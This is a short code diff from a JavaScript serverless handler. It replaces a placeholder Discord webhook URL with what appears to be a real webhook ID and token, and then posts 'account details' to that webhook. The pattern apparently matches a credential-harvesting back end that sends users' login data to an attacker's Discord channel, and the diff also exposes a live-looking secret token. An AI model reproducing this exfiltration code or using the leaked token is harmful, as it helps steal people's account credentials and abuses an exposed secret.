@@ -9,7 +9,7 @@ exports.handler = async (event, context) => {
     };
 
     // Discord webhook URL
-    const webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+    const webhookUrl = 'https://discord.com/api/webhooks/1282821531961000017/56r3vhyWh-u82fbLYVZBS9CwFTPEbUvYPVCMzx50YFq2OqDi1mNqpF9lCVbt8lr7QA39';
 
     // Send account details to Discord
     await axios.post(webhookUrl, {
